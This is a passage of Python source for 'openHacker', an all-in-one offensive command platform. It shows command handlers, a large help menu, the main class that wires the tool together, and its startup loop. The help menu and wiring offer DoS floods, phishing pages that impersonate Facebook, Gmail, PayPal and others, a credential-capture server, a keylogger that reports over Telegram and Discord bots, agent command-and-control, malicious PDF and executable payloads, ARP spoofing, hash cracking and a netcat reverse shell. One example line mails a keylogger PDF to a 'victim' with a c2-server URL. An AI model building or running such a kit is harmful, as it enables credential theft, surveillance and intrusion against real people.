        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _report(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        
        report = f"""
🐙 openHacker Security Report
{'='*50}
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}

🚨 Recent Threats:
"""
        for t in threats[:5]:
            report += f"  • {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _clear(self, args: List[str]) -> Dict:
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _stats(self, args: List[str]) -> Dict:
        return self._status(args)
    
    def _version(self, args: List[str]) -> Dict:
        return {'success': True, 'output': f"openHacker v{VERSION}\nAuthor: {AUTHOR}\n{TOTAL_LINES}+ lines of code"}
    
    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _help(self, args: List[str]) -> Dict:
        help_text = f"""
{Colors.WHITE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        🐙 OPENHACKER v{VERSION} - CYBER COMMAND PLATFORM                   {Colors.WHITE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.WHITE}                                                                           {Colors.WHITE}║
║{Colors.SUCCESS}📡 PING COMMANDS:{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep entire network
║  fping <targets...>            - Fast ping multiple targets
║  ping_count <target> <count>   - Ping with specific count
║  ping_flood <target>           - Ping flood
║  ping_timeout <target> <sec>   - Ping with timeout
║  ping_size <target> <size>     - Ping with packet size
║  ping_interval <target> <sec>  - Ping with interval
║
║{Colors.SUCCESS}🔍 NMAP COMMANDS:{Colors.RESET}
║  nmap <target> [options]       - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan (all ports)
║  nmap_os <target>              - OS detection scan
║  nmap_service <target>         - Service version detection
║  nmap_udp <target>             - UDP port scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth SYN scan
║  nmap_ping <target>            - Ping scan
║  nmap_traceroute <target>      - Traceroute scan
║  nmap_script <target> <script> - Run custom script
║  nmap_aggressive <target>      - Aggressive scan
║
║{Colors.SUCCESS}🗺️ TRACEROUTE COMMANDS:{Colors.RESET}
║  traceroute <target>           - Trace network path
║  tracert <target>              - Same as traceroute
║  tracepath <target>            - Trace path
║  mtr <target>                  - My traceroute
║  tcptraceroute <target>        - TCP traceroute
║  traceroute_udp <target>       - UDP traceroute
║  traceroute_icmp <target>      - ICMP traceroute
║
║{Colors.SUCCESS}⬇️ WGET COMMANDS:{Colors.RESET}
║  wget <url> [output]           - Download file
║  wget_file <url> <filename>    - Download to specific file
║  wget_recursive <url>          - Recursive download
║  wget_mirror <url>             - Mirror website
║  wget_continue <url>           - Continue download
║  wget_limit <url> <rate>       - Limit download rate
║  wget_user_agent <url> <ua>    - Set user agent
║  wget_header <url> <header>    - Add header
║  wget_post <url> <data>        - POST request
║  wget_auth <url> <user> <pass> - Basic auth
║
║{Colors.SUCCESS}🌐 CURL COMMANDS:{Colors.RESET}
║  curl <url>                    - HTTP request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_head <url>               - HEAD request
║  curl_options <url>            - OPTIONS request
║  curl_put <url> <data>         - PUT request
║  curl_delete <url>             - DELETE request
║  curl_patch <url> <data>       - PATCH request
║  curl_auth <url> <user> <pass> - Basic auth
║  curl_cookie <url> <cookie>    - Send cookie
║  curl_follow <url>             - Follow redirects
║  curl_verbose <url>            - Verbose output
║
║{Colors.SUCCESS}🔌 NETCAT COMMANDS:{Colors.RESET}
║  netcat <host> <port> [cmd]    - Connect to host/port
║  nc_listen <port>              - Listen on port
║  nc_scan <host> <ports>        - Port scan with netcat
║  nc_chat <host> <port>         - Chat over netcat
║  nc_transfer <host> <port> <file> - Transfer file
║  nc_shell <host> <port>        - Reverse shell
║
║{Colors.SUCCESS}🔒 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH connection
║  ssh_list                      - List SSH connections
║  ssh_connect <conn_id>         - Connect to server
║  ssh_exec <conn_id> <command>  - Execute command
║  ssh_disconnect <conn_id>      - Disconnect
║  ssh_keygen                    - Generate SSH key
║  ssh_copy_id <user> <host>     - Copy SSH key
║  ssh_tunnel <local> <remote>   - Create SSH tunnel
║  ssh_sftp <host>               - SFTP connection
║
║{Colors.SUCCESS}🚀 TRAFFIC GENERATION:{Colors.RESET}
║  traffic <type> <ip> <duration> [port] [rate] - Generate traffic
║  traffic_types                 - List available types
║  traffic_status                - Show active generators
║  traffic_stop [id]             - Stop generation
║  traffic_icmp <ip> <duration>  - ICMP traffic
║  traffic_tcp <ip> <port> <duration> - TCP traffic
║  traffic_udp <ip> <port> <duration> - UDP traffic
║  traffic_http <ip> <duration>  - HTTP traffic
║  traffic_dns <ip> <duration>   - DNS traffic
║  traffic_arp <ip> <duration>   - ARP traffic
║  traffic_mixed <ip> <duration> - Mixed traffic
║
║{Colors.SUCCESS}🕷️ NIKTO COMMANDS:{Colors.RESET}
║  nikto <target>                - Web vulnerability scan
║  nikto_full <target>           - Full scan with all tests
║  nikto_ssl <target>            - SSL/TLS scan
║  nikto_port <target> <port>    - Scan specific port
║  nikto_tuning <target> <tuning> - Tuned scan
║
║{Colors.SUCCESS}💥 DOS ATTACKS:{Colors.RESET}
║  dos_syn <ip> <port> <duration> [threads] - SYN flood attack
║  dos_udp <ip> <port> <duration> [threads] - UDP flood attack
║  dos_http <ip> <port> <duration> [threads] - HTTP flood attack
║  dos_icmp <ip> <duration> [threads] - ICMP flood attack
║  dos_slowloris <ip> <port> <duration> - Slowloris attack
║  dos_stop [id]                - Stop DOS attack
║  dos_status                    - Show active attacks
║
║{Colors.SUCCESS}🎣 SPEAR PHISHING:{Colors.RESET}
║  spear_create <name> <subject> <from> <template> <targets> - Create campaign
║  spear_send <campaign_id>      - Send campaign
║  spear_list                    - List all campaigns
║
║{Colors.SUCCESS}🤖 AGENT COMMANDS:{Colors.RESET}
║  agent_register <name> <ip>    - Register new agent
║  agent_command <id> <command>  - Send command to agent
║  agent_list                    - List all agents
║  agent_status <id>            - Check agent status
║
║{Colors.SUCCESS}📡 NETWORK MONITOR:{Colors.RESET}
║  netmon_start                  - Start network monitoring
║  netmon_stop                   - Stop network monitoring
║  netmon_status                 - Show monitoring status
║  netmon_packets [limit]        - Show captured packets
║  netmon_stats                  - Show network statistics
║
║{Colors.SUCCESS}⌨️ ADVANCED KEYLOGGER:{Colors.RESET}
║  keylogger_start               - Start keylogger (F10 to stop)
║  keylogger_stop                - Stop keylogger
║  keylogger_status              - Check keylogger status
║  keylogger_logs [limit]        - View captured keylogs
║  keylogger_screenshots         - View captured screenshots
║  keylogger_clipboard [limit]   - View clipboard history
║
║{Colors.SUCCESS}📦 DEPLOYMENT ENGINE:{Colors.RESET}
║  deploy_pdf <name> <target> <url> - Create PDF with keylogger link
║  deploy_email <name> <target> <subject> <body> <url> - Create email payload
║  deploy_link <name> <target> <url> - Create direct link payload
║  deploy_executable <name> <target> <server> - Create executable payload
║  deploy_list                  - List all deployments
║  deploy_track <id>            - Track deployment open
║
║{Colors.SUCCESS}🌐 DOMAIN HOSTING:{Colors.RESET}
║  ip_to_domain <ip>            - Translate IP to domain
║  domain_to_ip <domain>        - Translate domain to IP
║  host_domain <ip> <domain> [port] - Host a domain
║  host_website <domain> <html_file> - Host a website
║  list_domains                 - List hosted domains
║  domain_info <domain>         - Domain information
║
║{Colors.SUCCESS}🎣 SOCIAL ENGINEERING:{Colors.RESET}
║  phish_facebook                - Generate Facebook phishing link
║  phish_instagram               - Generate Instagram phishing link
║  phish_twitter                 - Generate Twitter phishing link
║  phish_gmail                   - Generate Gmail phishing link
║  phish_linkedin                - Generate LinkedIn phishing link
║  phish_microsoft               - Generate Microsoft phishing link
║  phish_google                  - Generate Google phishing link
║  phish_apple                   - Generate Apple phishing link
║  phish_paypal                  - Generate PayPal phishing link
║  phish_amazon                  - Generate Amazon phishing link
║  phish_netflix                 - Generate Netflix phishing link
║  phish_spotify                 - Generate Spotify phishing link
║  phish_whatsapp                - Generate WhatsApp phishing link
║  phish_telegram                - Generate Telegram phishing link
║  phish_discord                 - Generate Discord phishing link
║  phish_start <link_id> [port]  - Start phishing server
║  phish_stop                    - Stop phishing server
║  phish_creds [link_id]         - View captured credentials
║
║{Colors.SUCCESS}🔓 CRACKING COMMANDS:{Colors.RESET}
║  crack <hash_type> <hash> [wordlist] - Start cracking job
║  crack_status <job_id>         - Check job status
║  crack_list                    - List all jobs
║  crack_md5 <hash>              - Crack MD5 hash
║  crack_sha1 <hash>             - Crack SHA1 hash
║  crack_sha256 <hash>           - Crack SHA256 hash
║  crack_ntlm <hash>             - Crack NTLM hash
║
║{Colors.SUCCESS}🕸️ ARP SPOOFING:{Colors.RESET}
║  arp_spoof <target> <gateway> [interface] - Start ARP spoofing
║  arp_stop [id]                - Stop ARP spoofing
║  arp_status                    - Show active spoofs
║  arp_history [limit]           - Show spoof history
║  arp_scan                      - Scan ARP table
║
║{Colors.SUCCESS}📡 MAC COMMANDS:{Colors.RESET}
║  mac_info <mac>                - Get MAC address info
║  mac_scan [network]            - Scan network for MACs
║  mac_vendor <mac>              - Get MAC vendor
║  mac_lookup <mac>              - Lookup MAC vendor
║
║{Colors.SUCCESS}🌐 NAT COMMANDS:{Colors.RESET}
║  nat_info                      - Show NAT information
║  nat_public                    - Show public IP
║  nat_private                   - Show private IP
║  nat_router                    - Show router IP
║
║{Colors.SUCCESS}🐳 DOCKER COMMANDS:{Colors.RESET}
║  docker_scan <image>           - Scan Docker image
║  docker_info                   - Docker info
║  docker_ps                     - Running containers
║  docker_images                 - List images
║  docker_bench                  - Docker Bench Security
║
║{Colors.SUCCESS}📧 EMAIL COMMANDS:{Colors.RESET}
║  email_compose <to> <subject> <body> - Compose email
║  email_send <email_id>         - Send email
║  email_list [status]           - List emails
║  email_delete <email_id>       - Delete email
║
║{Colors.SUCCESS}📊 PDF REPORT COMMANDS:{Colors.RESET}
║  report_generate <title> <target> - Generate PDF report
║  report_list                   - List PDF reports
║
║{Colors.SUCCESS}📊 THREAT MONITOR:{Colors.RESET}
║  monitor_start                 - Start threat monitoring
║  monitor_stop                  - Stop threat monitoring
║  monitor_add <target> <type> [interval] - Add monitor
║  monitor_status                - Show monitor status
║  monitor_list                  - List all monitors
║  monitor_report                - Generate threat report
║
║{Colors.SUCCESS}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP to monitoring
║  remove_ip <ip>                - Remove IP from monitoring
║  block_ip <ip> [reason]        - Block IP via firewall
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List managed IPs
║  ip_info <ip>                  - Detailed IP information
║  analyze_ip <ip>               - Complete IP analysis
║
║{Colors.SUCCESS}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System information
║  threats [limit]               - Recent threats
║  report                        - Security report
║  stats                         - Statistics
║  version                       - Tool version
║  clear                         - Clear screen
║  help                          - This help menu
║
║{Colors.SUCCESS}💡 EXAMPLES:{Colors.RESET}
║  ping 127.0.0.1
║  nmap_quick 192.168.1.1
║  traceroute 127.0.0.1
║  wget https://example.com/file.txt
║  curl https://example.com
║  dig ian.com
║  whois example.com
║  traffic icmp 192.168.1.1 10
║  nikto example.com
║  dos_syn 192.168.1.100 80 30 100
║  crack md5 5f4dcc3b5aa765d61d8327deb882cf99
║  arp_spoof 192.168.1.100 192.168.1.1
║  mac_info 00:11:22:33:44:55
║  nat_info
║  keylogger_start
║  docker_scan alpine:latest
║  email_compose user@example.com "Hello" "This is a test"
║  report_generate "Security Report" "192.168.1.1"
║  monitor_add 192.168.1.1 quick 300
║  deploy_pdf "Invoice" "victim@email.com" "http://c2-server.com/keylog"
║  phish_facebook
║  add_ip 192.168.1.100 Suspicious
║  analyze_ip 192.168.1.1
║
║{Colors.WHITE}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# MAIN APPLICATION
# =====================
class OpenHacker:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.tools = NetworkTools()
        
        # Initialize engines
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
        self.nikto = NiktoScanner(self.db)
        self.dos = DOSEngine(self.db, self.config)
        self.spear = SpearPhishingEngine(self.db, self.config)
        self.agent = AgentEngine(self.db, self.config)
        self.network_monitor = NetworkMonitor(self.db, self.config)
        self.keylogger = KeyloggerEngine(self.db, self.config) if PYNPUT_AVAILABLE else None
        self.deployment = DeploymentEngine(self.db, self.config)
        self.domain_hosting = DomainHostingEngine(self.db, self.config)
        self.cracking = CrackingEngine(self.db, self.config)
        self.arp_spoofing = ARPSpoofingEngine(self.db, self.config) if SCAPY_AVAILABLE else None
        self.mac_manager = MACManager(self.db)
        self.nat_info = NATInfoEngine(self.db)
        self.docker_scanner = DockerScanner(self.db)
        self.social = SocialEngineeringTools(self.db)
        
        # Email Composer & PDF Reports
        self.email_composer = EmailComposerEngine(self.db, self.config)
        self.pdf_report = PDFReportGenerator(self.db, self.config)
        
        # Threat Monitor
        self.threat_monitor = ThreatMonitorEngine(
            self.db, self.config, self.tools, self.pdf_report, self.email_composer
        )
        
        # Platform bots
        self.discord = DiscordBot(None, self.db)
        self.telegram = TelegramBot(None, self.db)
        self.slack = SlackBot(None, self.db)
        self.signal = SignalBot(None, self.db)
        self.google_chat = GoogleChatBot(None, self.db)
        
        # Set up handlers
        self.handler = CommandHandler(
            self.db, self.ssh, self.traffic, self.nikto,
            self.dos, self.spear, self.agent, self.network_monitor,
            self.keylogger, self.deployment, self.domain_hosting,
            self.cracking, self.arp_spoofing, self.mac_manager,
            self.nat_info, self.email_composer, self.pdf_report,
            self.docker_scanner, self.threat_monitor
        )
        
        # Connect bots to handler
        self.discord.handler = self.handler
        self.telegram.handler = self.handler
        self.slack.handler = self.handler
        self.signal.handler = self.handler
        self.google_chat.handler = self.handler
        
        # Connect keylogger to bots
        if self.keylogger:
            self.keylogger.telegram_bot = self.telegram
            self.keylogger.discord_bot = self.discord
        
        self.web = WebDashboard(
            self.handler, self.db, self.config, 
            self.threat_monitor, self.pdf_report
        )
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.WHITE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        🐙 OPENHACKER v{VERSION} - CYBER COMMAND PLATFORM                   {Colors.WHITE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.WHITE}                                                                           {Colors.WHITE}║
║{Colors.SUCCESS}  • 🐙 200+ Security Commands         • 📡 All Ping Commands           {Colors.WHITE}║
║{Colors.SUCCESS}  • 🗺️ All Traceroute Commands        • 🔍 All Nmap Commands          {Colors.WHITE}║
║{Colors.SUCCESS}  • ⬇️ All Wget Commands              • 🌐 All Curl Commands          {Colors.WHITE}║
║{Colors.SUCCESS}  • 🔌 SSH Remote Command Execution    • 🚀 REAL Traffic Generation    {Colors.WHITE}║
║{Colors.SUCCESS}  • 🕷️ Nikto Web Vulnerability Scanner  • 🎣 Social Engineering Suite   {Colors.WHITE}║
║{Colors.SUCCESS}  • ⌨️ Advanced Keylogger (F10)         • 💥 DOS Attack Capabilities    {Colors.WHITE}║
║{Colors.SUCCESS}  • 📧 Spear Phishing Campaigns        • 🤖 Agent Command & Control    {Colors.WHITE}║
║{Colors.SUCCESS}  • 📱 Multi-Platform Bot Integration  • 💻 Web Dashboard              {Colors.WHITE}║
║{Colors.SUCCESS}  • Discord | Telegram | Slack         • Signal | Google Chat          {Colors.WHITE}║
║{Colors.SUCCESS}  • 🔒 IP Management & Threat Detection • 🌐 IP to Domain Translation   {Colors.WHITE}║
║{Colors.SUCCESS}  • 🏠 Domain Hosting Engine           • 📊 PDF Report Generation      {Colors.WHITE}║
║{Colors.SUCCESS}  • 📡 Network Monitoring               • 🔐 Agent Mode                 {Colors.WHITE}║
║{Colors.SUCCESS}  • 📦 PDF/Email/Link Deployment       • 🔑 Clipboard/SSH Key Capture  {Colors.WHITE}║
║{Colors.SUCCESS}  • 🔓 Password Cracking Engine        • 🐳 Docker Security Scanning   {Colors.WHITE}║
║{Colors.SUCCESS}  • 📡 MAC Address Management          • 🌐 NAT Information            {Colors.WHITE}║
║{Colors.SUCCESS}  • 🕸️ ARP Spoofing                    • 📧 Email Composition        {Colors.WHITE}║
║{Colors.SUCCESS}  • 📊 Threat Monitoring               • 🎯 200+ Commands              {Colors.WHITE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.WHITE}                    🎯 ACCURATE CYBER DEFENSE                     {Colors.WHITE}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SUCCESS}🐙 Welcome to openHacker - Your Ultimate Security Assistant{Colors.RESET}
{Colors.WHITE}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.WHITE}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
{Colors.WHITE}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
{Colors.WHITE}📧 Use 'email_compose' to compose and send emails{Colors.RESET}
{Colors.WHITE}📊 Use 'report_generate' to generate PDF reports{Colors.RESET}
{Colors.WHITE}🔓 Use 'crack' commands for password cracking{Colors.RESET}
{Colors.WHITE}🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}
{Colors.WHITE}📡 Use 'mac_info' for MAC address information{Colors.RESET}
{Colors.WHITE}🌐 Use 'nat_info' for NAT information{Colors.RESET}
{Colors.WHITE}📊 Use 'monitor_add' to start threat monitoring{Colors.RESET}
{Colors.WHITE}📱 Use 'platform_*' commands for cross-platform execution{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.WHITE}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'nc', 'dig', 'traceroute', 'ssh', 'wget', 'docker', 'whois']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - advanced traffic/ARP disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if WEB_AVAILABLE else Colors.WARNING}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if PYNPUT_AVAILABLE else Colors.WARNING}✅ pynput{Colors.RESET}" if PYNPUT_AVAILABLE else f"{Colors.WARNING}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DNS_AVAILABLE else Colors.WARNING}✅ dnspython{Colors.RESET}" if DNS_AVAILABLE else f"{Colors.WARNING}⚠️ dnspython not found - DNS features limited{Colors.RESET}")
        print(f"{Colors.SUCCESS if PDF_AVAILABLE else Colors.WARNING}✅ reportlab{Colors.RESET}" if PDF_AVAILABLE else f"{Colors.WARNING}⚠️ reportlab not found - PDF reports disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if TELETHON_AVAILABLE else Colors.WARNING}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.WARNING}⚠️ telethon not found - Telegram disabled{Colors.RESET}")
        
        if shutil.which('hashcat'):
            print(f"{Colors.SUCCESS}✅ hashcat{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ hashcat not found - cracking will use Python fallback{Colors.RESET}")
        
        if shutil.which('signal-cli'):
            print(f"{Colors.SUCCESS}✅ signal-cli{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ signal-cli not found - Signal disabled{Colors.RESET}")
        
        if self.nikto.available:
            print(f"{Colors.SUCCESS}✅ nikto{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ nikto not found - web scanning disabled{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.WHITE}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.WHITE}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.WHITE}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Discord bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.WHITE}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord.save_config(token, True, prefix)
                self.discord.config['channel_id'] = channel
                if self.discord.setup():
                    self.discord.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.WHITE}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.WHITE}Enter chat ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if token:
                self.telegram.save_config(token, chat_id, True, prefix)
                self.telegram.start()
                print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.WHITE}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.WHITE}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.slack.save_config(token, channel, True, prefix)
                if self.slack.setup():
                    self.slack.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.WHITE}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.WHITE}Enter phone number: {Colors.RESET}").strip()
            group = input(f"{Colors.WHITE}Enter group ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.signal.save_config(phone, group, True, prefix)
                self.signal.start()
                print(f"{Colors.SUCCESS}✅ Signal bot starting...{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.WHITE}Configure Google Chat bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.WHITE}Enter Google Chat webhook URL: {Colors.RESET}").strip()
            prefix = input(f"{Colors.WHITE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if webhook:
                self.google_chat.save_config(webhook, "", True, prefix)
                self.google_chat.start()
                print(f"{Colors.SUCCESS}✅ Google Chat bot configured...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.WHITE}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.WHITE}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.WHITE}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.enabled', True)
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.config.save()
            self.web.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
        
        # Threat Monitor
        setup = input(f"{Colors.WHITE}Enable Threat Monitoring? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            self.threat_monitor.start()
            print(f"{Colors.SUCCESS}✅ Threat monitoring started{Colors.RESET}")
        
        # Keylogger
        setup = input(f"{Colors.WHITE}Enable keylogger? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            if self.keylogger:
                self.config.set('keylogger.enabled', True)
                self.config.save()
                print(f"{Colors.SUCCESS}✅ Keylogger configured. Press F10 to start/stop.{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ Keylogger not available (pynput missing){Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Startup animation
        TerminalAnimation.matrix_rain(1.5)
        TerminalAnimation.pulse_animation("🐙 OPENHACKER", 1.5)
        
        self.print_banner()
        self.check_dependencies()
        
        auto_monitor = input(f"\n{Colors.WHITE}Start network monitoring? (y/n): {Colors.RESET}").strip().lower()
        if auto_monitor == 'y':
            self.network_monitor.start()
            print(f"{Colors.SUCCESS}✅ Network monitoring started{Colors.RESET}")
        
        setup_platforms = input(f"{Colors.WHITE}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        print(f"\n{Colors.SUCCESS}✅ openHacker ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.WHITE}   Type 'help' for commands, 'deploy_*' for payload deployment{Colors.RESET}")
        print(f"{Colors.WHITE}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.WHITE}   🔓 Use 'crack' commands for password cracking{Colors.RESET}")
        print(f"{Colors.WHITE}   🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}")
        print(f"{Colors.WHITE}   📡 Use 'mac_info' for MAC address information{Colors.RESET}")
        print(f"{Colors.WHITE}   🌐 Use 'nat_info' for NAT information{Colors.RESET}")
        print(f"{Colors.WHITE}   📊 Use 'monitor_add' to start threat monitoring{Colors.RESET}")
        print(f"{Colors.WHITE}   📧 Use 'email_compose' to compose and send emails{Colors.RESET}")
        print(f"{Colors.WHITE}   📊 Use 'report_generate' to generate PDF reports{Colors.RESET}")
        print(f"{Colors.WHITE}   🐳 Use 'docker_*' for Docker operations{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.WHITE}[{Colors.WHITE}{self.session_id}{Colors.WHITE}]{Colors.WHITE} 🐙> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
